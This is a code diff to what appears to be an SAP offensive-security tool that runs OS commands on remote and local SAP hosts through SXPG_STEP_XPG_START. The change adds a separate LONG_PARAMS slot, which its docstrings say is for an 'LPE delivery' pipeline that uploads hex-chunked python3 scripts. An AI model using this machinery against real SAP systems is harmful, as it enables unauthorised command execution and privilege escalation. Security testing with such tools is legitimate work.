@@ -3178,7 +3178,8 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
 
 def execute_remote_command(node: SAPNode, destination: str,
                            command: str, params: str,
-                           creds: Credentials = None) -> dict:
+                           creds: Credentials = None,
+                           long_params=None) -> dict:
     """Execute an OS command on a remote system via SXPG_STEP_XPG_START.
 
     Uses an existing TCP/IP destination (sapxpg) to run a command on the
@@ -3191,24 +3192,38 @@ def execute_remote_command(node: SAPNode, destination: str,
         command: executable to run (e.g. cmd.exe or /bin/sh)
         params: command parameters (e.g. /C whoami or -c whoami)
         creds: credentials on the source system
+        long_params: if specified (not None), sent to LONG_PARAMS verbatim
+            and PARAMS is sent as-is — this is the mode our LPE delivery
+            uses ("python3" + "-c" + 800-char hex chunk).  If None (the
+            default), legacy auto-route kicks in: PARAMS gets params if
+            short, LONG_PARAMS gets params if long.
 
     Returns dict with: success, output (list of lines), error
     """
     result = {"success": False, "output": [], "error": ""}
+
+    if long_params is not None:
+        # Explicit two-field mode: caller knows what goes in each slot.
+        sxpg_params = params
+        sxpg_long_params = long_params
+    else:
+        # Legacy single-source auto-route: pick the slot that fits.
+        sxpg_params = params if len(params) <= 255 else ""
+        sxpg_long_params = params if len(params) > 255 else ""
 
     # Base kwargs shared by both call attempts
     _sxpg_kwargs = dict(
         TARGET="",
         DESTINATION=destination,
         EXTPROG=command,
-        PARAMS=params if len(params) <= 255 else "",
+        PARAMS=sxpg_params,
         STDINCNTL="R",
         STDOUTCNTL="M",
         STDERRCNTL="M",
         TRACECNTL="0",
         TERMCNTL="C",
         TRACELEVEL="0",
-        LONG_PARAMS=params if len(params) > 255 else "",
+        LONG_PARAMS=sxpg_long_params,
         CONNCNTL="H",
     )
 
@@ -3261,7 +3276,8 @@ def execute_remote_command(node: SAPNode, destination: str,
 
 
 def execute_local_command(node: SAPNode, command: str, params: str,
-                          creds: Credentials = None) -> dict:
+                          creds: Credentials = None,
+                          long_params=None) -> dict:
     """Execute an OS command on the node itself via SXPG_STEP_XPG_START.
 
     Creates a self-referencing TCP/IP destination (pointing to localhost)
@@ -3272,6 +3288,12 @@ def execute_local_command(node: SAPNode, command: str, params: str,
         command: executable to run (e.g. cmd.exe or /bin/sh)
         params: command parameters
         creds: credentials on the system
+        long_params: optional separate LONG_PARAMS slot (forwarded to
+            execute_remote_command).  When set, PARAMS keeps ``params``
+            and LONG_PARAMS gets ``long_params`` — required for the LPE
+            upload pipeline where PARAMS="-c" and the script lives in
+            LONG_PARAMS.  When None (default), legacy single-source
+            auto-route applies.
 
     Returns dict with: success, output (list of lines), error
     """
@@ -3286,7 +3308,8 @@ def execute_local_command(node: SAPNode, command: str, params: str,
         dest_name = cached_dest
         try:
             return execute_remote_command(
-                node, dest_name, command, params, creds)
+                node, dest_name, command, params, creds,
+                long_params=long_params)
         except Exception:
             # Cache could be stale (operator deleted dest, etc.);
             # fall through to full discovery.
@@ -3403,4 +3426,5 @@ def execute_local_command(node: SAPNode, command: str, params: str,
         pass
 
     # Execute command via the destination
-    return execute_remote_command(node, dest_name, command, params, creds)
+    return execute_remote_command(node, dest_name, command, params, creds,
+                                  long_params=long_params)
